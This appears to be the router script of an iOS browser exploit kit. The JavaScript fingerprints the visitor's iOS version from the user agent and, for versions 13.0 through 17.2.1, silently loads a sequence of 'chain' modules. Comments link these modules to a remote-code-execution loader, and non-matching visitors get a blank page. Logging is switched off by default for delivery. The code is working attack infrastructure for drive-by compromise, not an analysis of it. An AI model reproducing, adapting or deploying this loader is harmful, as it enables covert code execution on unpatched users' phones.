(function() {
  var ua = navigator.userAgent;

  function getIOSVersion() {
    function pad(s) { return s.length === 1 ? '0' + s : s; }
    // v3 合并版：优先解析 OS 版本串（CPU iPhone OS 15_8 / 15_8_7），
    // 能区分补丁版；Safari Version/ 仅作兜底
    var u = ua.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/);
    if (u) return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
    u = ua.match(/CPU OS (\d+)_(\d+)(?:_(\d+))?/);
    if (u) return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
    u = ua.match(/Version\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u && /^Mozilla\/5\.0 /.test(ua))
      u = ua.match(/iOS\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u) return 0;
    return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
  }

  var ver = getIOSVersion();

  // 日志总开关（router/chain_main 共用，对齐 18 线 rce_loader 的 SERVER_LOG）：
  // false = 完全静默（默认/交付态）；true = 客户端打印 + /api/debug/logs 逐条镜像到服务器。
  // 真机排障时把这里改成 true，交付默认 false。
  window.__15X_SERVER_LOG = false;
  var __15X_LOGID = 0;

  // rlog：console + 宿主日志面板钩子 + sessionStorage 接力（悬浮面板续显）+ /api/debug/logs 同步镜像
  function rlog(msg) {
    var line = '[router] ' + msg;
    if (!window.__15X_SERVER_LOG) return;
    try { console.log('[log] ' + line); } catch(e) {}
    try { if (window.__logViewAdd) window.__logViewAdd(line); } catch(e) {}
    try {
      var buf = JSON.parse(sessionStorage.getItem('__15x_router_logs') || '[]');
      buf.push(new Date().toISOString().slice(11, 23) + ' ' + line);
      if (buf.length > 300) buf = buf.slice(buf.length - 300);
      sessionStorage.setItem('__15x_router_logs', JSON.stringify(buf));
    } catch(e) {}
    try {
      var mx = new XMLHttpRequest();
      mx.open('POST', '/api/debug/logs', false);
      mx.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
      mx.send('#' + (__15X_LOGID++) + ' ' + line);
    } catch(e) {}
  }

  rlog('iOS version: ' + ver + (ver ? '' : '(非 iOS 环境)'));

  // 对齐 18 线：链内脚本下载带 page_view 的 eventId（&ctx=），供服务端关联访问与资源下载
  function runtimeEventId() {
    try {
      var b = window.PromotionIntegrationBridge;
      if (!b || typeof b.ready !== 'function') return Promise.resolve('');
      return Promise.resolve(b.ready()).then(function (rt) {
        return (rt && rt.pageViewEventId) || '';
      }).catch(function () { return ''; });
    } catch (e) { return Promise.resolve(''); }
  }

  function loadScript(src, onload) {
    runtimeEventId().then(function (ev) {
      var s = document.createElement('script');
      s.src = src + '?' + Date.now() + (ev ? '&ctx=' + encodeURIComponent(ev) : '');
      s.onerror = function() { rlog('加载失败: ' + src); };
      if (onload) s.onload = onload;
      document.head.appendChild(s);
    });
  }

  // v3 合并版版本门：五线并一（各线范围合并）
  //   13x: 13.0.0 – 13.7.0 | 14x: 14.0.0 – 14.8.1 | 15x: 15.0.0 – 15.8.6
  //   16x: 16.0.0 – 16.7.14 | 17x: 17.0.0 – 17.2.1
  if ((ver >= 130000 && ver <= 130700) ||
      (ver >= 140000 && ver <= 140801) ||
      (ver >= 150000 && ver <= 150806) ||
      (ver >= 160000 && ver <= 160714) ||
      (ver >= 170000 && ver <= 170201)) {
    rlog('v3 版本命中,加载链');
    loadScript('platform_module.js', function() {
      loadScript('utility_module.js', function() {
        loadScript('chain_main.js');
      });
    });
  } else {
    rlog('版本不在 v3 覆盖范围(13.0–17.2.1),不加载链(页面保持空白)');
  }
})();
